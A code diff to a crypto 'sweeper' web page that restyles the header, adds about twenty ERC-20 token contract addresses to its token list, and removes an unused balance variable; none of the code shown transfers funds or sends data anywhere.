@@ -8,9 +8,9 @@
   <style>
     body { background: #0e0e0e; color: white; font-family: 'Segoe UI', sans-serif; margin:0; padding:0; text-align:center; }
     .main { padding:20px; max-width:600px; margin:auto; }
-    .logo { max-width:100px; display:block; margin:20px auto 0; }
-    h1 { font-size: 2rem; margin: 10px 0; }
-    h2 { margin-top: 0; font-size: 1.4rem; }
+    .logo { max-width:100px; display:block; margin:10px auto 10px; }
+    h1 { font-size: 2rem; margin: 10px 0 5px 0; }
+    h2 { margin: 5px 0 20px 0; font-size: 1.2rem; }
     button { padding:10px 20px; margin:10px; background:#0a65ff; color:white; border:none; border-radius:8px; cursor:pointer; font-weight:bold; }
     button:hover {background:#084dc1;}
     table { width:100%; margin-top:20px; border-collapse:collapse; background:#111; border-radius:10px; overflow:hidden; }
@@ -23,8 +23,8 @@
 </head>
 <body>
   <div class="main">
-    <img src="cswep.logo.png" alt="CSWEP Logo" class="logo">
     <h1>CSWEP – The Magic Crypto Sweeper (BETA)</h1>
+    <img src="cswep.logo.png" alt="CSWEP Logo" class="logo">
     <h2>Free stuck crypto. Convert to cash. No gas!</h2>
     <button onclick="connectWallet()" id="connectBtn">Connect Wallet</button>
     <div id="walletAddress"></div>
@@ -47,7 +47,23 @@
       { name: 'DAI', symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
       { name: 'SHIBA', symbol: 'SHIBA', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18 },
       { name: 'MATIC', symbol: 'MATIC', address: '0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0', decimals: 18 },
-      { name: 'LINK', symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 }
+      { name: 'LINK', symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
+      { name: 'ARB', symbol: 'ARB', address: '0x912CE59144191C1204E64559FE8253a0e49E6548', decimals: 18 },
+      { name: 'CRV', symbol: 'CRV', address: '0xD533a949740bb3306d119CC777fa900bA034cd52', decimals: 18 },
+      { name: 'UNI', symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', decimals: 18 },
+      { name: 'AAVE', symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18 },
+      { name: 'COMP', symbol: 'COMP', address: '0xc00e94cb662c3520282e6f5717214004a7f26888', decimals: 18 },
+      { name: 'GRT', symbol: 'GRT', address: '0xc944E90C64B2c07662A292be6244BDf05Cda44a7', decimals: 18 },
+      { name: 'MKR', symbol: 'MKR', address: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', decimals: 18 },
+      { name: '1INCH', symbol: '1INCH', address: '0x111111111117dc0aa78b770fa6a738034120c302', decimals: 18 },
+      { name: 'ENS', symbol: 'ENS', address: '0xcEb5dD7f91366f34cfdB73A82D05C76ECAB1B03E', decimals: 18 },
+      { name: 'BAT', symbol: 'BAT', address: '0x0D8775F648430679A709E98d2b0Cb6250d2887EF', decimals: 18 },
+      { name: 'SNX', symbol: 'SNX', address: '0xC011A72400E58ecD99Ee497CF89E3775d4bd732F', decimals: 18 },
+      { name: 'YFI', symbol: 'YFI', address: '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e', decimals: 18 },
+      { name: 'LDO', symbol: 'LDO', address: '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32', decimals: 18 },
+      { name: 'REN', symbol: 'REN', address: '0x408e41876cCCDC0F92210600ef50372656052a38', decimals: 18 },
+      { name: 'BAL', symbol: 'BAL', address: '0xba100000625a3754423978a60c9317c58a424e3D', decimals: 18 },
+      { name: 'ZRX', symbol: 'ZRX', address: '0xE41d2489571d322189246DaFA5ebDe1F4699F498', decimals: 18 }
     ];
 
     async function connectWallet(){
@@ -83,7 +99,6 @@
 
     function addBalanceRow(tokenName, balance){
       const row = document.createElement('tr');
-      const isDust = balance > 0 && balance < 1;
       row.className = balance === 0 ? 'disabled-row' : '';
       row.innerHTML = `
         <td><input type="checkbox" ${balance > 0 ? 'checked' : 'disabled'}> ${tokenName}</td>
